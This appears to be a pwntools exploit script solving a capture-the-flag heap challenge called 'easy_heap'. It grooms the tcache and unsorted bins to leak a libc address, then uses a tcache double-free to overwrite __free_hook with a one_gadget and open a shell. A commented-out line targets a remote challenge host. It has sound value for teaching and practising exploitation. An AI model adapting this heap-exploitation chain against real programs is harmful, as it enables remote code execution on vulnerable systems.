from pwn import *
import pwnlib

context.log_level = 'debug'

def malloc(size,content):
	p.recvuntil('> ')
	p.sendline('1')
	p.recvuntil('> ')
	p.sendline(str(size))
	p.recvuntil('> ')
	p.sendline(content)

def free(index):
	p.recvuntil('> ')
	p.sendline('2')
	p.recvuntil('> ')
	p.sendline(str(index))

def puts(index):
	p.recvuntil('> ')
	p.sendline('3')
	p.recvuntil('> ')
	p.sendline(str(index))

#p = process('./ptrace ./easy_heap', shell=True, env={"LD_BIND_NOW":"1"})
p = process('./easy_heap', env={"LD_BIND_NOW":"1"})

#p = process('strace -o out.strace ./easy_heap', shell=True, env={"LD_BIND_NOW":"1"})
#p = process('rr record -o ./record ./easy_heap', shell=True, env={"LD_BIND_NOW":"1"})
#p = remote('118.25.150.134',6666 )



#pause()

for i in range(10):
	malloc(0x20,'a')

for i in range(3,10):
	free(i)

for i in range(3):
	free(i)

for i in range(10):
	malloc(0x20,'a')


for i in range(6):
	free(i)

free(8) #fill tcache
free(7) #unsorted bin

malloc(0xf8,'b') #change next_chunk pre_inuse = 0

free(6) #fill tcache
free(9) #unsorted bin

#unsorted bin point to chunk[0]
for i in range(8):
	malloc(0x20,'b')

#pwnlib.gdb.attach(p)
#pause()

#leak libc
puts(0)

libc_base = u64(p.recv(6).ljust(8,'\x00'))
log.success('libc base addr : 0x%x'%libc_base)
libc_base = libc_base - 96 - 0x3ebc40
log.success('libc base addr : 0x%x'%libc_base)
free_hook = libc_base + 0x3ed8e8
one_gadget = libc_base + 0x4f322
log.success('free_hook addr : 0x%x'%free_hook)
log.success('one_gadget addr : 0x%x'%one_gadget)

#clear unsorted bin
malloc(0x20,'d')

#free place to malloc
free(1)

#0x0000555555759410
#tcache dup
free(0)
free(9)

#pwnlib.gdb.attach(p)

#hijack free_hook to one_gadegt
malloc(0x20,p64(free_hook))
malloc(0x20,'e')
malloc(0x20,p64(one_gadget))

#trigger one_gadget to getshelol
free(5)

p.interactive()
